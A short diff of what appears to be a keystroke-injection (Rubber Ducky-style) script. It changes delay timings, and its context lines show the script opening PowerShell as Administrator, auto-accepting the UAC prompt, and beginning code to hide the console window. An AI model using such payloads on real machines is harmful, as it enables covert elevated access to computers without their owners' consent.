@@ -1,4 +1,4 @@
-DELAY 5000
+DELAY 3000
 REM Open PowerShell as Administrator
 CONTROL ESCAPE
 STRING_DELAY 5
@@ -11,7 +11,7 @@ STRING_DELAY 5
 DELAY 2000
 ALT Y
 STRING_DELAY 5
-DELAY 2000
+DELAY 5000
 
 REM Define a function to hide the console window using Windows API
 STRING Add-Type @"
